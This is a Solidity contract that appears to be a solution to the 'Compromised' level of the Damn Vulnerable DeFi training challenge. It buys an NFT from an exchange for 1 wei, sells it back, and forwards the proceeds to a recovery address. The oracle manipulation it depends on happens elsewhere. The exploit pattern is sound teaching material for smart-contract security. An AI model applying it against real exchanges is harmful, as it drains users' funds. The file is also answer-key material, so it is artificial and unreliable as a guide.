//SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract ExploitCompromised is IERC721Receiver {

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;
    uint nftid;
    address recovery;


    constructor(TrustfulOracle _oracle, Exchange _exchange, DamnValuableNFT _nft, address _recovery) payable {
        oracle = TrustfulOracle(_oracle);
        exchange = Exchange(_exchange);
        nft = DamnValuableNFT(_nft);
        recovery = _recovery;
    }

    function buy() public {
        uint _nftid = exchange.buyOne{value: 1}();
        nftid = _nftid;
    }

    function sell() public {
        nft.approve(address(exchange), nftid);
        exchange.sellOne(nftid);
    }

    function sendRecoveredFunds(uint amount) public {
        payable(recovery).transfer(amount);
    }

    function onERC721Received(address, address, uint256, bytes calldata) public pure override returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive () external payable {}

}